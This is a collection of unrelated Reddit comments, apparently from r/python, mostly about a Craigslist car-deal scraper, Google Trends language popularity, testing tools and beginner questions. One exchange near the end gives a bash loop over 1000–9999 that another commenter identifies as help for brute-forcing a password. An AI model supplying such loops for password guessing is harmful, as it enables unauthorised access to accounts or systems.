Amazing
I agree, %2Fm%2F05z1_ is better than %2Fm%2F07sbkfb.
Yes, they are about 15 December through 5 January when you zoom in.
if deal == 'good': ...
No no no no, you can't mix Google Trends "search term" with thesauruized concepts. Here, this is correct: https://trends.google.com/trends/explore?date=today%205-y&amp;q=%2Fm%2F05z1_,%2Fm%2F07sbkfb,%2Fm%2F02p97,%2Fm%2F0bbxf89,%2Fm%2F012l1vxv
Ok im very unfamiliar with trends and how it works. How does ‚Äùnodejs‚Äù as a term compre to ‚Äùnode.js‚Äù (with the dot) as a thesauruized concept? Nodejs ifaik does not mean anything else than the javascript platform.
There is a Craigslist library: https://pypi.org/project/python-craigslist/
Now imagine if at this point browsers have not yet got a scripting language. To be trendy and capture the dominant dev base of the time, that scripting language could have been based off Python. It'd first be named Monty, then LiveScript, then finally PythonScript. And then Microsoft made their own implementation and call it PScript.
What questions do you have?
That was so funny, jmz60r6av6731.png came out of my nose.
I feel like I've lived in that timeline, but the ease of client-side scripting made bitcoin mining as an alternative to advertising to support websites a thing, which brought about the apocalypse and the authors of our universe rewound it back so we got Javascript instead.
:-{
Cute nothing between PHP (9) and VB (0)
If you use the raw "search term"s it will usually return a tiny fraction of the number of results as the "topic"s, so you can't mix-and-match. The topics include all alternate spellings, capitalizations, and most importantly, all known synonyms and strictly related alternatives in the concept index that google search uses for stemming.
You can [shoot from the hip](https://github.com/natural/java2python)
Sir. I have no idea what you‚Äôre talking about.
I made something similar for Gumtree (similar to Craigslist used in Australia) looking for road bikes and bike components every 5-10 minutes which runs on a raspberry pi Managed to pick up some power meter pedals dirt cheap a couple of months back
No one searches JavaScript. If I'm coding in js and need the docs for something i Google "is &lt;thing&gt;".
I used [https://www.mpfr.org/](https://www.mpfr.org/) Back then I wrote a small C application to do the calculations through this library, running it from Python. But I realize now that Python wrappers for it exist like [https://github.com/mdickinson/bigfloat](https://github.com/mdickinson/bigfloat) . Be aware that your number crunching performance will drop dramatically, but you'll have no limits on how deep you'll be able to dig into the Mandelbrot set. &amp;#x200B; Have fun!
Python is strongly typed. It‚Äôs not statically typed, though.
Edited, thank you. Not that it matters because it was downvoted to oblivion lol.
Thus: https://trends.google.com/trends/explore?geo=US&amp;q=javascript,%2Fm%2F02p97
That‚Äôs awesome man ! Can i ask you how you did that on the raspberry pi ?
Basically this is just a really poor measure because it's the search frequency in absentia of any other search term. The fact is that beginners will Google just java or just python or just JavaScript. Whilst correlated, there are too many other factors for it to be considered a useful metric.
I didn't claim it was useful, but I do claim that useful metrics such as salary surveys have closely tracked search interest for over a decade now.
As it should be; one can only hope the trend continues.
Curious about this as well.
Technically possible but I imagine it would take an insane amount of work... By identifying a master list of cars and manually inputting what would be a good deal for each year of each make and model... Orrr possibly comparing its listed price to Kelly blue book.
Is this Machine Learning?
The Unix utilities, split and cat are your friends!
I saw the programme and thought how an 18 year old Camry with 142000 miles on the clock for over $3000 is a good deal? A brand new one is only $30k, how has it depreciated so little over time? In the UK I can find a corolla a few years younger with less miles for half the price. It's way off topic, but can anyone explain why your new cars are so cheap and used car so expensive? Or is this supposed to be exception?
If the deal satisfies the filters it's a good deal.
Just a heads up. When I was selling my car on Craig's, any automated or bot sounding email was thrown in the trash so fast. You probably already know that though
I want to know too
 if Deal is Good:
You cannot program using a pseudo language. Python: Hold my beer...
You‚Äôve never worked on a large codebase with dozens of other people, have you? Types make all the difference when understanding other people‚Äôs code and refactoring without unexpected breakage.
May I ask how you are sending emails? Do you have your own emailserver?
Yes, and I don't believe you. In Java I get type declarations split across dozens of files, and I have to go track them down to figure out which method gets called. In python I find it easier to look at how the variables are being used.
Christ, I'm so glad this isn't a problem I have to solve.
Wow, Frasier REALLY went of the rails this season!

A 142000 mile Camry still has at least 100000 miles left on the clock, KBB for the highest trim level of that car in excellent condition is $2200 - 4000. A Corolla is a different class of car, not comparable unless you ignore most of what makes a Camry worth more money to begin with.
I've done this manually before, by pulling data into Excel. Then getting ratios to identity a good deal, eg years old to milage to cost. You can add weight to younger cars etc... I'd love to see this code, I've never done python before.
Of course. But in other os?
What's the annual dip visible in all curves?
Can you post code? I need to do something similar. Thank you
Available in Windows through the WSL, or myriad other ways. I think they're probably just available on a MAC too
That will always be False because they do not point to the same object:)
Upvote only because it is a text post instead of a video, but it probably belongs on r/learnpython as it's pretty basic stuff for beginners.

Nah it can be True if one sets `Deal = Good`
No, it's AI
Christmas/newyears
Is it possible you can share the code? Cuz, I tried to do such thing and i failed at the emailing part.
Actually, I would really like mining instead of all those crappy ads. However we would need some kind of browser api to make it transparent to the user, making it clear that the website is, in fact, mining and maybe give the ability to limit the compute power it can use.
I just wanted to ask the best way of starting to learn it tbh, because I have no idea where to start. I have a plan in my head of what I want to do but thats about it lol. Basically wanted to scrape data from a website and then format it into a excel document organised under tables
 First, You should Learn the Fundamentals of Python, and you should start coding with modern python as i did, i started the Fundamentals of Python 3.7 in Fast speed in this course. You will know to code if you beginner . [Python 3.7 The Quickest Way | Python Essentials](https://www.udemy.com/python-essentials-mastering-programming-with-python/?couponCode=A78APSSELL560D4RBB1)
Maybe it compares them to something or some STANDARD?
Not sure what your asking, but what you have is right. It‚Äôs printing out the type. It‚Äôs showing you integers, strings and floats.
At scale types really do make code simpler to keep correct. That said I don't believe Java is particularly good at doing that.
Pretty interesting. How big is the final build?

OP, what‚Äôs the likelihood of you posting the source? I‚Äôm interested if you did weights or what your methodology is for designing this.
Very interesting. Is your source code available? Somewhere?
Do you have this code available? Thanks
python has imap and pop3 libraries. You can just hook into any popular web mail that way.
Just start. Yeah, use beautiful soup. Start from the first bit, obtain the data you want. It's really easy, just a few lines of code. Google some tutorials. Then ok, getting it into a sensible format is a lot harder, but just work on it step by step.
I'm building a symbolic SI unit library.
That‚Äôs cool! I don‚Äôt know much about Teflon as a material, but are there any environmental concerns about using it as rocket exhaust (assuming that‚Äôs what you‚Äôre doing)? As opposed to simpler chemical fuels.
At the tine that I posted, 2 of the 3 comments recommended conda, and they had a number of upvotes each. Now they have rightfully been downvoted, which is why you can't see them (I assume they're folded by default).
I used bs4. Definitely shoot me a message if you have any questions, or need some help
Nonetheless, for a car to retain over 10% of its value after nearly 20 years is astonishing.
I have no idea But honestly, were using so little, I don't think it matters.
Well said! I am a proud owner of 04 Corolla with 145,000 miles.
My email is pretty cookie cutter but its not too bad. It says something along the lines of: "Hi, I saw your post about the &lt;car title&gt; and I was wondering if it is still available? Thanks!"
I will put it on my git repo and drop a link
How much thrust can you get from one of the little cubes?
UPDATE: Did not expect this to be as popular as it is. #Blessed. To cover some questions I saw a lot: No ML being done here. I didn't think it was appropriate for the first iteration of this, so I'm just manually filtering records. I will push this to my github today and drop a link for anyone that wants source code.
I haven‚Äôt done any work in python in a while and I would loooove to take a look.
Sounds like he just setup a crontab to run the program and dump the results to a text file
I would love that link when you get around to it. Great job!
how about: &amp;#x200B; `if good in deal`
I have a couple of ideas for you. Using large amounts of data to solve problems screams data science. Jupyter notebooks/Pandas/Matplotlib may be of great interest to you. Sign up on Kaggle for access to many datasets. I am sure that you can find some datasets around your personal interests. For Pandas I recommend a couple of videos to dip your toe. Brandon Rhodes -[ Pandas From The Ground Up - PyCon 2015 ](https://www.youtube.com/watch?v=5JnMutdy6Fw) Kevin Markham - [Data Science Best Practices with pandas \(PyCon 2019\)](https://www.youtube.com/watch?v=dPwLlJkSHLo) If you want to learn Matplotlib, you cannot have a better introductory for visualizing data than Corey Schafers latest series. [A 10 video series on using matoplotlib](https://www.youtube.com/watch?v=UO98lJQ3QGI&amp;list=PL-osiE80TeTvipOqomVEeZ1HRrcEvtZB_) A different approach could be getting a Fitbit. Fitbit has an API so you make your own app around your health statistics (exercise, sleep patterns etc etc). The key to motivation is doing things that interest you. Also get into version control if you aren't already. Git is well worth learning. Once you have a grasp of git at the command line sign up on Github to share your code.
Please share source when you can. Thx!
I‚Äôd think of that as spam since it‚Äôs a direct copy of the title. You should make it say something like ‚ÄúI saw your Honda for sale...‚Äù or something like that.
I took a public transit app project (specifically to track delays of busses and predict them) If you want to get into it, try not to reinventing the wheel (I lost much of my time on it), instead search for gtfs, and if you wanna make something with public bikes (correlation bikes-weather maybe) search for gbfs. I think having some graph showing availibility of bikes could be nice and somewhat manageable for beginner.
New cars are cheap because there's no luxury tax (only sales tax), free trade/no taxes or duty, cheap shipping by boat to Japan (or made here), so it's quite close to the cost of manufacturing it, and not driven up higher like in other countries. Used cars are still valuable because gas is cheap here, so older lower fuel economy models don't add too much to the cost of ownership, there are lower safety/smog standards in a lot of provinces and states (only inspected when you buy/sell a used vehicle, not every year like the UK), and car parts are cheap so maintaining the vehicle is not as expensive (especially if you do the work yourself).
Dude, I just finished used car shopping, mostly with Facebook and it was stressful as hell. This would have been great to have, like, a month ago. Keep up the good work!
Does that mean he can only buy Honda‚Äôs?
I guess if I were single with no kids that might be appealing. The permanent, full time jobs with benefits in this area may not be exciting or cutting edge but they pay very well and provide stability. You do make a point though as I'm sure there are probably fulltime remote jobs I could look into.
You can use a decorator to catch exceptions. It keeps your function from becoming messy. A decorator is a wrapper around another function. It‚Äôs a fairly basic python tool.
"Hi, I saw your post about the *not Honda* and I was wondering if it is still available? Thanks!"
Ahhh yeah thats a lot simpler! Thanks üòÖ
I got my first job after moving to LA with a similar script
Can you share your source code
Thanks, I think I figured it out after posting. I don't think I need to use remote mode for my project. If I do I'll probably use some other player. My initial problem was terminating the application and ended up sending a sigquit to kill the app.
This is solid!
LEGEND
Count me in. I'd like to see your repo of it.
So it doesnt use the post title, it uses the actual make and model of the car. There is definitely room for improvement still

I know what a decorator is. I don‚Äôt know where your comment fits in the discussion between me and the other commenter. We were discussing how to keep the example code simple to beginner readers. I don‚Äôt think a decorator is a good idea there :) appreciate the effort though.
Haha
I'd say `&lt;year&gt; &lt;model&gt;`. &gt; Hi, I saw your post about the `08 Civic` and I was wondering if it is still available?
It fit in by being a clean way to ensure that a function never returns an exception. It‚Äôs not day 1 python, but it‚Äôs still pretty simple.
Please make a new post about the source. Might also crosspost it to /r/programming just cuz.
I would love to see this as well please!! üôå
What‚Äôs your average runtime? My suggestion would be to look for some optimization steps. At some point crossing the next row should be constrained by your previous row choices. I would also take a step back and think about evualteCell and swapNumbers. They seem to borrow a repeat a lot of code. So maybe there‚Äôs some parts you could factor out into a separate function. I‚Äôd love to look into this more. Well see if I have time. But getting your code out there is a good first step to elevating you python skills.
If you‚Äôre already scraping web pages, you could check the kelly blue book value and see if it‚Äôs less than that.
My name is Damien (Kane) Rigden. I need to update my website but I have some artwork on theartofkane.com. And some basic code on GitHub under the user name damienrigden. If anyone has some open source projects that a beginner could get involved in let me know!
I've spent several hours this week pulling my hair out trying to understand how the package importing system works. It's change several times over the years and doesn't make much sense. I eventually figured out that the folders themselves where being added as a package (without the root folder name) plus a few other oddities... but I have to admit Python is probably one of the worst languages I've dealt with when it comes to managing its own packages.
I posted it elsewhere in the thread but the code is here: https://github.com/damienrigden/Sof-Dot-Project let me know what you think!
It goes from about 9:58.45 to 10:00:15 in the video. Seconds minutes and hours all work the same.
One would hope but I don't think Kotlin is making a dent, yet.
Thank, this was the kind of explanation I was looking for, although not everything applies to the UK.
Careful with sharing your code or doing anything much beyond this. Craigslist is one of the most absurd places when it comes to C&amp;Ds and otherwise outright suing people for building anything on top of their base platform.

Good to hear! I'm entering senior year of college so I will be on the hunt for a job
It's a difficult balance. I'm always quite careful to never mention the specific car, because them replying "which car?" is a good hint that it's not a private sale after all.
I've done similar thing. Instead of parsing HTML you can use RSS and FeedParser library [https://pypi.org/project/feedparser/](https://pypi.org/project/feedparser/)
UPDATE: I added a RTD link on the website :)
I made this crowd-sourced programming AI thing. It was just for fun, but I think it's actually quite useful. I've been using it to help me learn groovy this week, but it's even better with the more popular languages like python. There is a demo writing python in the second gif on the github page. I've release a version for windows and I'm working on one for linux. [https://github.com/irthomasthomas/helpmecode](https://github.com/irthomasthomas/helpmecode) It's a wrapper of [howdoi.py](https://howdoi.py) and so the best way that you can help improve it, is to ask and answer code questions on stackexchange. &amp;#x200B; Cheers!
What if two variables (Deal and Good) are equal..
In that case something like this should work: def get_skill_counts(inputfile_text, desired_skills): return {skill: inputfile_text.count(skill) for skill in desired_skills} This assumes: * `inputfile_text` is a string read from the input file. * `desired_skills` is a list of strings, where each of the strings is one of the lines from the skills file. Example use: from pathlib import Path inputfile_text = Path('inputfile.txt').read_text() desired_skills = [line.strip() for line in Path('desired-skills.txt').open()] for key, value in get_skill_counts(inputfile_text, desired_skills): print(key, ':', value)

I guess good deals is subjective. So you will need to set the parameters of a good deal. Price of a car in the range of 1000 - 15000. Then possibly narrow down keywords; needs repairs, it's a fixer, etc,. When people post on craigslist and these other shops they use the same verbiage to some degree. Maybe there is a way easier way to think of it and implement it than I am thinking of.

UPDATE: I fixed all the inconsistencies in the docs.
Oh, sorry guys, that was me. Recently started some Python projects at work and had to get up to speed...
&gt; wouldn't write a utility command in Java and I wouldn't write a complex system in Python It's a bit ironical that as you were criticizing the generic use of "popular" programming language as indicated by search terms (which I agree with) you did that with another generic statement. A "complex" system is as vague as "popular" programming language. What does it do? Is it an operating system, systems program, database manipulation, web app etc? Java would not be the choice for most of these cases? Many programs in data science and numerical computation where Python is increasingly being used (with other wrapper libraries like Scipy, Pandas etc) are as complex and more challenging than the "complex" systems Java is used for. Also, who are the target users? What libraries does it need? Lot of questions need to be answered and most of the time the answer is not one programming language but many at different levels. Also the common use cases where Java was suitable and/or the advantages it provided have been largely superseded by many other languages. For example those which target JVM like Kotlin, Clojure, Scala etc or language like Rust which is more suitable for systems programming and offers better protection compared to C/C++ than Java. As of now the only reason Java persists is the large inertia in the enterprises where it is used and the large number of libraries written in it. Also for some reason many unis keep teaching Java to the undergrads (although this has been shifting in recent years).
This table reveals a bit of a bias of the graphics in the op. The charts are searches, as opposed to survey points of usage or preference. It's a bit like using gas stations and counting cars to determine the trends in auto manufacturing.
This looks awesome. What are the yellow color ones? :O is it a train?
I can't tell from the dateline, but what's that huge synchronized dip? What is that, Thanksgiving &amp; Christmas/New Years?

It is also from a really solid generation of cars. Well built for lasting and potentially easier to maintain than some of the newer stuff that uses more adhesives to save weight. I bought a similar one (same generation higher mileage) about half a decade ago and it is still going strong.
It‚Äôs actually higher than 10% of the value. No one buys a Toyota for MSRP in the United States.
Yes. If you look closer you'll also see that [they dip every weekend](https://trends.google.com/trends/explore?date=today%201-m&amp;geo=US&amp;q=Python,java).
I'm aware, comparing current resale value against MSRP is just easier than trying to sus out how much people actually paid.
Read their documentation. Or failing that, their source.
They sure are.
/s
Absolutely, modern cars are difficult to maintain yourself (having said that, I don't know how to maintain older cars either, not that I ever really needed to). I also think we're close enough to autonomous vehicles that if another decade or two, if you want the cheapest transport possible it'd be calling up cars as and when you need it.

If you iterate though things, in python, one item at a time, you're using the python interpreter to process every item, and stopping the optimisations that allows the cpu to to read X elements at a time and operate on them in one fell swoop (for instance). I don't know too much detail, but i think that's the general principle, and pandas/numpy are heavily optimised under the hood. There are various other libraries where it's really worth understanding where you're data is being sent in to C function calls, and how to make sure you're taking advantage of the fact, without needlessly involving the python interpreter.

Well I'm just hoping the Camry(which itself would be old enough to drink) lasts until we get some decent used electric cars on the market.
Thanks for sharing! I started with Chapter 1. I must say one of the best pandas tutorials ever. Explained it very well. Bookmarked the link.
That 2007 Elantra is literally the exact same model, year, and color as my car, haha. Is someone selling my car without my knowledge?
Yeah! This is one of the most rewarding things about coding IMO. When I was still in school, I wrote a similar weekend hack project in Python to get a good deal on a graphics card. At the time (maybe this is still the case?), newegg.com would have open box deals on graphics cards all the time. These were great deals, but since there was usually a really small stock, they would get snagged really quickly. So I used newegg's unpublished API to query for a list of candidate open box cards every 5 minutes, and my script would send me a growl notification if it found any new cards under a given price threshold. It worked great, and I got a good deal on card within a week. It felt like cheating!
Thank you. I'm glad that you liked it. This gives me immense motivation. Will come up with some other cool tutorials for helping every novice to excel in the field of machine learning.
Oh so the "still available" emails that I get are all automated... gonna ignore them from now on lol

Also, we need to be clear. I use python because I choose to use it and generally love it. I also occasionally use Java because the dillweeds at Google forced it on us through android and I can't be bothered to learn the next language they foisted upon us. So the Java line in the above graph should be soul sucking black.

It's iteration but in C which is 100x+ faster than python. In python even an integer is an object and adding two integers involves looking up methods on objects and creating a new object. Numpy adding two integers is just a couple of cpu operations.
There are already a million tutorials out there. What makes yours any different? You created an account just to post your own content, and you haven't participated in any other topics. The way I read the spam policy, that makes you a spammer.
Maybe a good deal, filters can miss details, like the engine is missing.
Also blockchain is used somewhere inside there
Run just the import command on each of those 2 libraries, one at a time. I bet its of them.
Can we have the full program (although I doubt that's the actual problem). Also, more important: Write in PowerShell the following: Get-Command python | Format-List where.exe python Use both commands, you'll get more information from the first one, but there's one more piece of information in where.exe. I suspect somebody is playing some trick on you.
In ubuntu? Maybe use a bash loop? If you're asking about Python, you should do a for loop?
I understand your point... But the way algorithm works, it can be the only solution, and if you add another if statement saying something about engine, well, guess what that is a filter too. Right?
I have used both commands and the problem still persists, I am also pretty much a newbie so I also dont really understand the text printed out when I run the codes.
how can I do in whole thing?
 for i in `1000 9999`; do &lt;your command&gt; ${i}; done

this is the full program: from termcolor import colored from pyfiglet import figlet\_format import colorama colorama.init() &amp;#x200B; text=input('what do you wanna print out bro?

Very nice project! How big is it (lines of code). How much time did you put in it? Have you tried other game engines than pygames? Because i've tested pygames recently and was quite disappointed at how low level it was. Meaning that you have to put in a lot of work yourself to get simple features going, while you might have expected that these features would be already built-in. **Example**: If you want a button, you better be ready to draw a rectangle, then check the collision between the rectangle and the mouse, and if there is a collision (i.e. hover), then you implement yourself some visual change on the rectangle. Then if there is a click on your rectangle, you trigger the appropriate action. **What i expected** : a built in button object with default hover behavior, where i would just need to specify the action if it is clicked. But i've had trouble finding anything that was much better than that. PyQt turned out to be a bit better for what i wanted. And it had all sorts of buttons, and input/output mechanisms (forms) already built-in, which helped. Do you find that pygames was the best tool, or did you use it because it was the most common engine?
Sorry, but I'm a newbie and I dont really understand but I've run the program without any import involved and it can be run but whenever i import something it prints 'hey how its going' again especially 'pyfiglet' and 'termcolor'
The whole program is about 2000-3000 lines and I've been working on it for a couple of days. Also I have tried other higher level engines such as gamemaker 2 and condtruct 2 but I wasn't really a fan. I prefer the low level of pygame as it gives me more freedom over how features work, I also enjoy creating the maths and algorithms. There are many really easy to use engines which can create more impressive games such as unity, but they don't require as much time or knowledge on programming. It also has performance limitations yet it is definatley my prefered tool for writing games and software.
I know this is strange, but...

Cool! If you made this report into a table to make it easy to compare that would be pretty sweet. You could even try different 'ranking' approaches to see how you agree with the table priorities.
I like the code style and the type annotations, it's pretty easy to see the code flow. That being said, I'm kind of leery of using MD5 for hashing purposes.
Ive heard that‚Äôs it‚Äôs possible to find people who will pay you for writing code. Might just be a myth.
&gt;The title gives me the impression of a competition mindset. It's not. Each type of problem requires its own tools to be solved. Yup, exactly this. This kind of fanboyism on Reddit is getting really old and it just shows how naive and immature people are who post stuff like this.
In the U.K. you can use the HPI api to get a valuation and the compare it with the price on Craigslist. There are a fair few datasets with list prices for a specific spec and mileage of second hand vehicle. Not sure if there is an equivalent in the US Could then use that to identify vehicles where there is a difference between the listed price and the expected valuation.
Thanks! I have an option for using sha256 instead just in git stash but still defaulting to md5 due to speed. Can you suggest a better alternative?
No. It‚Äôs Iowa.
RemindMe! 1 Day "craigs"
I think you might be onto something there. :)
I would recommend one of the Blake series of functions. They are much more collision resistant that MD5 and have about the same performance when it comes to hashing.
It's because of [this](https://media.giphy.com/media/LM32avXE5MwPm/giphy.gif) gif of a bear stealing/throwing away trash :)

Doing some focused page scraping from Wikipedia can be a good way to flex a lot of python's muscles. A favorite project is to scrape for Olympics data, medals per country or something, and build a graph. Even better if it's a question you actually want to answer (what entities did the top 10 {thing you care about}) Concepts needed: HTTP requests HTML parsing Data manipulation Useful Libraries: requests beautifulsoup (bs4) matplotilib (or other plotting library)

Yes, It seems like it would be in violation of Craigslist's terms of use: [https://www.craigslist.org/about/terms.of.use.en-us](https://www.craigslist.org/about/terms.of.use.en-us). The "Use" section looks like they would prohibit scraping the website.
Highly useful for some items, but if you get false positives of they don't reply or if the item is listed incorrectly, you miss it. There is a lot of human aspects that we expect to be accurate and simply isn't. Hell, I found a car for sale that was listed with no information and the only way I found it was to filter cars with pictures and 4 cylinder under 120k miles...it was a Jeep with a 6 cylinder without Jeep in the title and with 116 miles in the listing (not 116k, 116 even though it had 116k). I think this would be more useful if it send it to yourself as well so you can scope it out before you reach out to them.

Selenium is a browser automation tool and runs in a browser. Beautiful Soup is a parser for HTML and XML documents. Their project just trawls webpages and grabs the HTML and parses it to extract certain fragments of the page - something more suited to Beautiful Soup than Selenium

Read the sidebar, which explains how to format code, among other things.
I see a lot of quotes about popularity quoting the TIOBE index (I think) which from the website seems to be counting Google searches per language, so they always seem to say python and JavaScript are hugely popular I guess because they're beginner friendly and therefore have more questions being asked. Python more specifically is used to automate certain parts of things, it's often invisible how it's used in a project , like maybe the application is made in java or C++ then a suite of python tools are used to run testing or analysis of that program ..... That's the impression I've gotten but I'm in a similar position to you... Most of the advice I've had about popularity is "don't worry about it" use what you're comfortable using until an employer insists you use something else, because they (programming languages) largley speaking are capable of the same stuff....

I don't know where you're looking on Github but Python is the third most common language behind Java and Javascript, and growing much faster than either of those.
Yeah, it's weird. That's the vibe I get. I've been investing pretty heavily in Python for a few years now but it's hard for me to move forward because most of my employers don't view it as a "real" programming language. It's strange because 3.5 (asyncio) makes it a contender with any language out there in terms of handling IO which is pretty much the main concern. What do people do though when they're learning? They get basic syntax and then bail for something more complicated or do they leave programming all together?
Mostly the contributions to its popular packages, not necessarily the number of repositories. The ecosystem itself isn't as robust. React, for example, is huge. React has its own cult following. But Flask does not. Nor does Django.
 def check_xyz(): if cond1: if cond2: if cond3: return True return False So, like: def check_xyz(): return cond1 and cond2 and cond3 ???
In your first example, how do you justify what you propose over: if cond1 and cond2 and cond3: return True ? It's a lot clearer in my opinion.
I think a large amount of them will give up, especially people trying to learn purely online , without school. That's what I've been doing and it's not easy haha... I figure a lot of people get to about the stage I'm at , can basically hack together any application idea they have and then give up learning when it becomes about more complex stuff like software architecture and graph theory xD
You should really give Kotlin a chance.
Good to know I'm apparently writing production-quality Python. I'm a self taught developer and although I write software at my job, I've never worked in a team. The things you mention very much align with what I consider best practises.
Popularity contests are messy enough even with a sense of what data to use as a measurement of popularity. Just in your post alone, there is: - "most learned language" - "most desirable to learn" - number of contributors - number of stars - size of the "community of beginners" - how "professionally prevalent" it is - number of job posts in which it's listed And then there are many more ways we might choose to frame popularity, especially if we want to make a point about how Python (or Java or whatever) is the best. There are relatively-objective factors (e.g. it's wonderful balance of ease of use and utility) and then there are messy human factors, e.g., the [Narcissism of small differences](https://en.wikipedia.org/wiki/Narcissism_of_small_differences). &gt; But I think there might be a big leap from beginner programs to building large applications. Absolutely. A big leap indeed. But one of the factors I think that leads to Python's popularity (especially as a beginner language) is that not everyone who learns Python even intends to make that leap. There are many areas of professional computing that benefit from and maybe even require competent coding skills but are not software engineering/app development.
Honestly I love the community but I think that's where we fall short. With Javascript, everything has a place and students come into the field learning a pretty specific path. Look at FreeCodeCamp, it moves from scrapping together Javascript with HTML to actual software engineering. With Python, most of the learning resources are beginner level but don't actually teach anyone how to build real software.
I mean, I guess it depends on how you want to measure it, but Python has the second highest number of active monthly users on Github (recently passing Java). I'm not sure how much more robust it can be.
This is dope dude , nice job
Yeah I can see what you mean there. My question was about popularity but its rooted in another idea. Python is prevelant everywhere in the learning space. It's the vscode number 1 download. But it's just not used widely in enterprise software. For a language that's actually pretty old and widely learned, it's not nearly as corporately adopted as I'd expect. I do think it's really cool that anyone can pickup Python and accomplish a task. I think my main question is about software engineering. Honestly, I'm just wondering how long it's going to be before I get hired to code in a Python web framework instead of dotnet or React.
You're asking for help in /r/python with (presumably bash) shell looping to run a java program to bruteforce a password.
scrapy FTW
I just use `unittest`. If I were testing something in a browser I'd probably use Selenium... If the tests run and the coverage is there it doesn't matter too much what you're using.
What's the quote "lies, damned lies and statistics". The whole "most popular" programming thing is impossible to figure out and honestly rather pointless. There are stats like the op posted, with searches and number of git repos etc... Do these stats show a rising popularity? Yes. There are slot of buts however. I.e python is a popular beginners / learning language. Meaning more searches is to be expected. Also over the past 5 years I believe cloud computing has increased the use of Linux OS (talking out my arse here), which come with python (2) installed. Does that have an impact? Who knows. And for git repos, well python is popular for scripting as well as larger apps, so the count of repos will be increased. Also the learning / beginners usage has impact here too. The job listing are a good general indication of professional use there are also alot of buts. In the professional world there is alot of legacy systems out there meaning job stats will always have an older skew to them. The job listing are also very dependent on location. If you live near a whole bunch of banks you might still see listens for Fortran / COBOL etc. In the end, it doesn't matter, python is popular. Is it the most popular? Who knows... Can anyone claim to have the most popular language? Not really it's impossible to measure. Maybe JavaScript can claim to be the most popular front end language? Maybe assembly can claim to be the most popular, as everything ends up as assembly in the end.
Nothing fancy, stack traces, the PyCharm debugger and breakpoints, and if unit testing is needed then [nose2](https://github.com/nose-devs/nose2) or just plain unittest.

`pytest` is a powerful and popular testing library. It is also compatible with tests written for the built-in `unittest` package.
It's pretty straightforward. Below are the basic steps 1. Install python3 on your pi 2. If you are using bs4 you'll want to install parser libraries and its dependencies sudo apt-get install libxml2-dev libxslt-dev python-dev sudo apt-get install python3-lxml python-lxml 3. Install required python libraries - my program uses pandas sudo pip3 install bs4 pandas lxml 4. Set your program to run at startup sudo nano /etc/profile sudo python3 /home/pi/gumtree.py &amp; &amp;nbsp; Happy to share the code if you are interested

I store all my data in sqlite which enables me to only output the same search result once but also check for updates in the listing (i.e. the seller changes the listing price) The output is a pandas dataframe by email using the standard email and smtp libraries.

I definitely agree for short conditions that can fit on one line / be read easily. I should have clarified that I mean this for longer conditions (maybe with some computation within each if statement).

I've sold cars without engines before and there's nowhere on Craigslist to specify whether it has an engine or not (besides in the title/body). There is a place to enter the number of cylinders, and I guess you could write "0". But I still enter the number of cylinders in the engine that the car HAD, because that information is crucial to someone buying the car (unless they're just scrapping it).
[Well this was a fun afternoon project](https://gist.github.com/checktheroads/c5beaa96fae26d77880b18d9a15c6ca4). Only requires the `ifaddr` library. I wrote and tested this completely on my iPhone in Pythonista, so I can‚Äôt 100% confirm that it works on Windows, but I believe it will. Give it a go!
I believe it's just part of the premium, it says its licensed but yeah I'm not going to even tempt it if theres no documentation. Thanks for the reply.
 NombreL[i]=Nombre &lt;...snip...&gt; A√±osL[i]=A√±oDeNacimiento Neither of these variables exist when you attempt to assign values to one of their respective indicies. They have not been defined, so you get the error. Additionally, you cannot assign value directly to a list index. NombreL = [] NombreL += [Nombre] would work but it assigns Nombre to the next available index rather than a specific one. You could insert a value at a specific index, but you'd maybe slice the list and rebuild to do so (or at least, that's how I've done it in the past).
You can use the dir() command to get the attributes of the python object. eg: \&gt;&gt;&gt; import datetime \&gt;&gt;&gt; print(dir(datetime.datetime)) \['\_\_add\_\_', '\_\_class\_\_', '\_\_delattr\_\_', '\_\_doc\_\_', '\_\_eq\_\_', '\_\_format\_\_', '\_\_ge\_\_', '\_\_getattribute\_\_', '\_\_gt\_\_', '\_\_hash\_\_', '\_\_init\_\_', '\_\_le\_\_', '\_\_lt\_\_', '\_\_ne\_\_', '\_\_new\_\_', '\_\_radd\_\_', '\_\_reduce\_\_', '\_\_reduce\_ex\_\_', '\_\_repr\_\_', '\_\_rsub\_\_', '\_\_setattr\_\_', '\_\_sizeof\_\_', '\_\_str\_\_', '\_\_sub\_\_', '\_\_subclasshook\_\_', 'astimezone', 'combine', 'ctime', 'date', 'day', 'dst', 'fromordinal', 'fromtimestamp', 'hour', 'isocalendar', 'isoformat', 'isoweekday', 'max', 'microsecond', 'min', 'minute', 'month', 'now', 'replace', 'resolution', 'second', 'strftime', 'strptime', 'time', 'timetuple', 'timetz', 'today', 'toordinal', 'tzinfo', 'tzname', 'utcfromtimestamp', 'utcnow', 'utcoffset', 'utctimetuple', 'weekday', 'year'\] \&gt;&gt;&gt;

&gt; Additionally, you cannot assign value directly to a list index. You can if it already exists or is the next available index.

Just my 2 cents from what I have noticed personally as primarily a Ruby developer. &amp;#x200B; When I go for looking for jobs (in pretty much any area of software engineering) e.g. on LinkedIn an overwhelming amount of them are looking for Python or have Python in the job posting. I have also been asked in interviews if I know python... &amp;#x200B; If you really look at it and what is available for it, then it gives you really good places to start making things.

Consider a timer that lets it wait at least 30-60 minutes from the initial posting time. All the scammer emails come in almost immediately after posting.
So here is my improvement. Whenever I see a lot of if...elif...elif... I tend to think that there is a bit of logic or math that I could do to replace it. Check out the number of lines that I get to cut out of the boxText function: def boxTest(row,col): global board boxList = [] print("[%s][%s]" % (row,col)) imin = (row // 3) jmin = (col // 3) for i in range(3*imin,3*imin+3): for j in range(3*jmin,3*jmin+3): boxList.append(board[i][j]) # If number is in the box, break loop and go to next number if boxList.count(board[row][col]) &gt; 1: return False else: return True In a way with row and col you are creating a modulo 3 number system. Anyway, think about it. "You code reaches ultimate Zen not when there is nothing to add, but when there is nothing to take away."

I don't think it has to be a debate. I like Python. I use it for all of my projects and I'm a regular speaker at our Python Meetup, and an open source contributor to a few of the micro web Frameworks. What is strange to me is that for being so popular, it feels underrepresented. Maybe that's the word I'm looking for - underrepresented. When it comes to engineering, Python feels underrepresented. There's no "yeah, but.." to it. Python is incredible. I'm trying to figure out where the discrepancy is. Comparing it to Javascript, I receive 2 or 3 emails a day asking if I'll apply for their React position. For Python, a recruiter called me once a few weeks ago asking if I knew Django. For Javascript, there are tons of YouTube videos, with tons of views, about all sorts of advanced topics. With Python, I'm looking at the same 4 YouTube channels every time. Its not so much that I have an issue with it but wondering where the breakdown is. I'd love to be part of the solution, trust me.

Fucking amazing! Keep working on it. It could spare so much time OwO. Just saw the future.
